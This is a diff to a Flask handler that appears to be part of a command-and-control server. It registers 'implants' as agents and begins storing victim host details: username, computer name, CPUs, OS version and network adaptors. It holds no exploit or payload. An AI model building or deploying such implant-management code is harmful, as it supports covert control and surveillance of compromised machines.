@@ -26,9 +26,13 @@ def register_agent(): # --> this is a handler
     if reg_data == None:
         return jsonify({"status": "no data"})
 
-    reg_password = reg_data["password"]
-    reg_whoami = reg_data["whoami"]
-    reg_agent_id = reg_data["agent_id"]
+    reg_password  = reg_data["password"]
+    reg_whoami    = reg_data["whoami"]
+    reg_agent_id  = reg_data["agent_id"]
+    reg_username  = reg_data["username"]
+    reg_cpus      = reg_data["cpus"]
+    reg_osVersion = reg_data["osVersion"]
+    reg_adaptors  = reg_data["adaptors"]
 
     if reg_agent_id == None or reg_password == None:
         return encrypt_data({"status": "failed to get data from implant"})
@@ -41,7 +45,7 @@ def register_agent(): # --> this is a handler
             login_user(agent)
             print(f"[+] agent {agent.agent_id} has been authenticated")
         else:
-            agent = Agent(agent_id=reg_agent_id, username=reg_whoami)
+            agent = Agent(agent_id=reg_agent_id, username=reg_username, computer_name=reg_whoami, cpus=reg_cpus, osVersion=reg_osVersion, adaptors=reg_adaptors)
             db.session.add(agent)
             db.session.commit() ## saves the data to the database
             agent.authenticated = True
